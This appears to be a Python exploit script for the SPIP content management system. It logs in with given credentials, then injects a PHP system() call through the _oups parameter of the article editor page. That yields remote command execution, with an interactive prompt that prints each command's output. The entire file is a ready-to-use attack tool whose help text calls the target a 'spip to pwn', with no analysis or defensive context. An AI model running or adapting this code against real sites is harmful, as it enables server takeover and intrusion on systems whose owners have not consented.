import click
import bs4
import requests
import sys

s = requests.Session()
s.headers.update(
    {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'})


def login(target, username, password):
    login_soup = bs4.BeautifulSoup(
        s.get(f'{target}/spip.php?page=login').content, 'html.parser')
    post_data = {}
    for input in login_soup.find(id='formulaire_login').select('input'):
        post_data[input.get('name')] = input.get('value')
    post_data['var_login'] = username
    post_data['password'] = password
    if 'spip_admin=deleted' in s.post(f'{target}/spip.php?page=login', data=post_data, allow_redirects=False).headers['Set-Cookie']:
        sys.exit('Unable to login, please verify the supplied credentials.')


def check_article(target, cmd, article_id):
    r = s.get(f'{target}/ecrire/?exec=article&id_article={article_id}')
    if r.status_code != 200:
        sys.exit(
            f'Unable to find an existing article with id "{article_id}". Please check spip articles, and pass one which you have backend access to.')
    if cmd != None:
        print(exec_cmd(target, cmd, article_id))
        return
    while True:
        print(exec_cmd(target, input('>>> '), article_id))


def exec_cmd(target, cmd, article_id):
    cmd_res = s.get(
        f'{target}/ecrire/?exec=article&id_article={article_id}&_oups=czoxOiJhIjtpOjE6MDs=\'"><div name="zzz" hidden><?php system(\'{cmd}\')?></div><!--')
    cmd_soup = bs4.BeautifulSoup(cmd_res.content, 'html.parser')
    try:
        return cmd_soup.find_all(attrs={'name': 'zzz', 'hidden': True})[0].text

    except:
        sys.exit('Unable to retrieve output. You can edit the code, and replace the "system" function with another one, or with "phpinfo()" to see disabled functions.')


@click.command()
@click.option('--target', '-t', help='spip to pwn ex: http://localhost/', required=True)
@click.option('--username', '-u', help='Spip username or email', required=True)
@click.option('--password', '-p', help='Spip password', required=True)
@click.option('--command', '-c', help='Command to exec (interactive mode by default)')
@click.option('--article_id', '-a', help='ID of an existing article (default : 1)', default=1)
def main(target, username, password, command, article_id):
    login(target, username, password)
    check_article(target, command, article_id)


if __name__ == '__main__':
    main()
